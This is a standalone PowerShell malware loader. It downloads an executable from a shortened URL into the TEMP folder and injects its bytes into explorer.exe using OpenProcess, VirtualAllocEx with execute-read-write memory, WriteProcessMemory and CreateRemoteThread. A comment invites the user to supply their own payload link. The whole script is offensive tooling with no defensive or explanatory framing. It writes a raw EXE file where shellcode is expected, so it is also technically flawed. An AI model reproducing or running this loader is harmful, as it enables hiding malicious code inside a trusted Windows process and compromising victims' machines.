# Set payload URL and download path
$payloadUrl = "https://tinyurl.com/5cexkpbw"  # <-- replace with your actual direct EXE link
$payloadPath = "$env:TEMP\payload.exe"

# Download the payload
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing

# Read payload bytes
$payload = [System.IO.File]::ReadAllBytes($payloadPath)

# Add P/Invoke with necessary functions for injection
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Desired access flags for OpenProcess
$PROCESS_ALL_ACCESS = 0x001F0FFF

# Find explorer.exe process
$explorer = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
if (-not $explorer) {
    Write-Error "[-] explorer.exe process not found."
    exit
}

# Open handle to explorer.exe
$hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $explorer.Id)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to open explorer.exe process."
    exit
}

# Allocate memory in explorer.exe process
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$baseAddress = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$payload.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($baseAddress -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate memory in explorer.exe."
    [Injector]::CloseHandle($hProcess) | Out-Null
    exit
}

# Write payload to allocated memory
$bytesWritten = [UIntPtr]::Zero
$writeResult = [Injector]::WriteProcessMemory($hProcess, $baseAddress, $payload, [uint32]$payload.Length, [ref]$bytesWritten)
if (-not $writeResult -or $bytesWritten.ToUInt32() -ne $payload.Length) {
    Write-Error "[-] Failed to write payload to explorer.exe memory."
    [Injector]::CloseHandle($hProcess) | Out-Null
    exit
}

# Create remote thread to execute payload
$hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $baseAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to create remote thread in explorer.exe."
    [Injector]::CloseHandle($hProcess) | Out-Null
    exit
}

Write-Host "[+] Injection into explorer.exe completed successfully."

# Close handles
[Injector]::CloseHandle($hThread) | Out-Null
[Injector]::CloseHandle($hProcess) | Out-Null
